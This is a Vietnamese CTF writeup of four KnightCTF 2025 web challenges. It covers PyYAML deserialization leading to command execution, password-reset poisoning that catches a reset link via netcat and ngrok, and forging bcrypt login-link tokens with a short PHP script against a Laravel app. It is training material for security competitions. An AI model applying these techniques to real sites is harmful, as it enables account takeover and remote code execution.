---
title: "KnightCTF 2025"
description: "KnightCTF 2025"
summary: "KnightCTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-01-21
draft: false
cover: ../../post/knight2024/feature.jpg

authors:
  - winky
---

| Category | Challenge Name | Difficulty |
| -------- | -------------- | ---------- |
| Web      | Baby Injection  | Easy |
| Web      | Knight Cal | Easy |
| Web      | Admin Access | Easy |
| Web      | Knight Connect | Medium |

## Baby Injection

### Hints

PyYaml Injection

### Solution

Challenge cho ta một trang web như sau

![image](https://hackmd.io/_uploads/Sy23AsCD1g.png)

Sau khi lục kĩ trang web thì mình không thấy gì ngoài cái URL nên mình thử decode cái endpoint xem

![image](https://hackmd.io/_uploads/HkQ1QRlOyx.png)

Ok thì có vẻ là nội dung mình đưa lên sẽ được base64 decode và đưa ra web nhưng mà mình thử đưa vào chuỗi khác thì lại lỗi

Đến đây thì mình biết là phải truyền vào một đoạn yaml mới được nên xem thử có payload nào liên quan không. Rất may vì mình mò được trong đây

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md

Ok thì mình thử một cái payload xem có gì hot không

![image](https://hackmd.io/_uploads/SkYmQ0e_Je.png)

Ok thì khi chạy web đã tạo ra cho ta một range object từ 1 đến 10 đúng như đoạn yaml mình truyền vào khi nãy

![image](https://hackmd.io/_uploads/SJ7MZnCwyx.png)

Tiếp đến mình thử lệnh subprocess xem sao

![image](https://hackmd.io/_uploads/BkIW7RluJe.png)

Rất may là nó ra luôn flag :))

![image](https://hackmd.io/_uploads/B1-0Z3CwJg.png)

Flag : KCTF{d38787fb0741bd0efdad8ed01f037740}

## Knight Cal

### Hints

No hint

### Solution 

Challenge cho mình một trang web sau

![image](https://hackmd.io/_uploads/B1fv3Cg_1g.png)

![image](https://hackmd.io/_uploads/S13_hCld1x.png)

Có thể thấy khi mình truyền vào một phép tính thì web sẽ eval phép đó và truyền ra result. Ngoài ra web còn đưa cho mình một file txt gì đó có tên là một chữ cái.

![image](https://hackmd.io/_uploads/BJW0hCguyx.png)

Đến đây mình nhận ra mỗi số tương ứng với một chữ cái nên mình thử brute hết xem. Sau khi brute thì ta có kết quả sau 

![image](https://hackmd.io/_uploads/Hk9mT0e_Jg.png)

Ở đây mình nhận ra chúng ta có thể cấu nên chữ flag bằng 4 số 7,1,9,5

Nên mình thử điền vào 7195 xem có gì hot

![image](https://hackmd.io/_uploads/rJyOTRgdJe.png)

Hot thật

Flag : KCTF{_c0ngR4t5_KNIGHT_f1naLLy_Y0U_g07_tH3_r1gh7_m4tH_}

## Admin Access

### Hints

SSRF

### Solution

Challenge cho ta một trang web sau

![image](https://hackmd.io/_uploads/Syu4z3ADJx.png)

Sau khi đăng nhập thì mình không thấy gì khả nghi

![image](https://hackmd.io/_uploads/HyEKMnADke.png)

Ấn dashboard thì quay lại trang log in luôn

![image](https://hackmd.io/_uploads/BkL2GnAwkg.png)

Mở thử devtool and well mình thấy một email rất sú

![image](https://hackmd.io/_uploads/B11AG2RPye.png)

Lúc này thì mình mới ngó qua tính năng forgot password

![image](https://hackmd.io/_uploads/ryKEmh0wkg.png)

Ở đây mình thử nhập vào email đã được leak từ devtool bên trên và có một reset link được gửi đến email

![image](https://hackmd.io/_uploads/rkTS73Aw1x.png)

Sau đó mình catch được một cái request sau

![image](https://hackmd.io/_uploads/SkRp-RlOke.png)

Ok thì đến đây ta có thể SSRF bằng cách sử dụng netcat và ngrok thôi

![image](https://hackmd.io/_uploads/B1cJfCgd1x.png)

Sau khi ấn reset password thì mình bắt được một gói tin sau

![image](https://hackmd.io/_uploads/HJ2EGClOJg.png)

Ok thì có đây là link reset password mà ta cần tìm

![image](https://hackmd.io/_uploads/SyxLLz0x_kl.png)

Vào link trên và ta có thể đổi mật khẩu tùy ý. Đăng nhập với username là kctf2025 để lấy được flag

![image](https://hackmd.io/_uploads/B1n_-Cx_1x.png)

Flag : KCTF{PaSsW0rD_ReSet_p0isOn1ng_iS_FuN}

## Knight Connect

### Hints

Hashing, brute-force

### Solution

Challenge cho mình một trang web sau

![image](https://hackmd.io/_uploads/Hk2tGRgO1e.png)

Sau khi thử đăng nhập thì cũng không có gì hot cả với list danh sách người dùng

![image](https://hackmd.io/_uploads/Ske5JyZdJe.png)

Lúc này thì mình mới mò vào source và đọc file resources/views/users/index.blade.php thì mình để ý thấy flag sẽ xuất hiện khi session có admin 

```php
@if (isset($flag) && session()->has('is_admin') && session('is_admin'))
    <div class="flag">
        Flag: {{ $flag->flag }}
    </div>
@endif
```

Ok lúc đầu thì mình có nghĩ đến tìm token secret gì đó và tạo một session mới nhưng đến khi xem các route thì mình phát hiện có một cách đăng nhập khác là bằng link

```php
<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;

Route::get('/', function () {
    if (session()->has('user_id')) {
        return redirect()->route('users');
    }
    return view('welcome');
})->name('dashboard');

Route::middleware('guest')->group(function () {
    Route::get('/register', [AuthController::class, 'showRegisterForm'])->name('register');
    Route::post('/register', [AuthController::class, 'register']);

    Route::get('/login', [AuthController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [AuthController::class, 'login']);

    Route::get('/request-login-url', [AuthController::class, 'showLoginUrlForm'])->name('request-login-url');
    Route::post('/request-login-url', [AuthController::class, 'requestLoginUrl']);

    Route::get('/login-link', [AuthController::class, 'loginUsingLink']);
});

Route::get('/users', function () {
    if (!session()->has('user_id')) {
        return redirect()->route('login')->withErrors(['auth' => 'You must be logged in to access this page.']);
    }
    $authController = new AuthController();
    return $authController->listUsers();
})->name('users');

Route::post('/logout', function () {
    if (!session()->has('user_id')) {
        return redirect()->route('login')->withErrors(['auth' => 'You are not logged in.']);
    }

    // Directly call the controller method
    $authController = new AuthController();
    return $authController->logout(request());
})->name('logout');

Route::get('/contact', function () {
    return view('contact');
})->name('contact');
```

Lúc này thì mình chuyển hướng xem route /login-link và /request-login-url

Xem file app/Http/Controllers/AuthController/php thì mình phát hiện được 2 hàm mà 2 endpoint kia gọi

```php
public function requestLoginUrl(Request $request) {
    $request->validate([
        'email' => 'required|email',
    ]);

    $user = User::where('email', $request->email)->first();

    if (!$user) {
        return back()->withErrors(['email' => 'Email not found']);
    }

    $time = time();
    $data = $user->email . '|' . $time;
    $token = bcrypt($data);

    $loginUrl = url('/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($user->email));

    return back()->with('success', 'Login link generated, but email sending is disabled.');
}



public function loginUsingLink(Request $request) {
    $token = $request->query('token');
    $time = $request->query('time');
    $email = $request->query('email');

    if (!$token || !$time || !$email) {
        return response('Invalid token or missing parameters', 400);
    }

    if (time() - $time > 3600) {
        return response('Token expired', 401);
    }

    $data = $email . '|' . $time;
    if (!Hash::check($data, $token)) {
        return response('Token validation failed', 401);
    }

    $user = User::where('email', $email)->first();

    if (!$user) {
        return response('User not found', 404);
    }

    session(['user_id' => $user->id]);
    session(['is_admin' => $user->is_admin]);

    return redirect()->route('users');
}
```

Ở đây hàm requestLoginUrl sẽ lấy email và time hiện để generate ra một login link bằng mã hóa bcrypt nhưng lại không đưa ra ngoài web

Hàm loginUsingLink sẽ lấy token, time, email để check nếu time tạo ra không quá 1 tiếng, và cũng sẽ check token có trùng với email và time không từ đó sẽ đăng nhập được

Lúc này mình mới nghĩ đến việc tự tạo token và đăng nhập nhưng có một vấn đề là email của admin là gì ? 

Sau khi ngó qua /contact thì mình chắc chắn email của admin trong list này (vì không còn chỗ nào có chứa email trong source nữa cả :vvv)

![image](https://hackmd.io/_uploads/HkyCv1-_yl.png)

Lúc này thì mình brute force hết các email bằng đoạn solve script sau

```php
<?php
function solve() {
    $email = "<email>";
    $expirationTime = 3600;
    $currentTime = time();
    $time = $currentTime;
    $data = $email . '|' . $time;
    $token = password_hash($data, PASSWORD_BCRYPT);
    $baseUrl = "https://kctf2025-knightconnect.knightctf.com/login-link";
    $url = $baseUrl . '?token=' . $token . '&time=' . $time . '&email=' . $email;
    return $url;
}

$link = solve();
echo $link;
```

Brute forece hết thì mình thấy email nomanprodhan@knightconnect.com có chứa flag

![image](https://hackmd.io/_uploads/rJJ1FRguye.png)

Flag: KCTF{_congrat5_KNIGHT_y0U_hack3d_mY_Acc0Un7_}
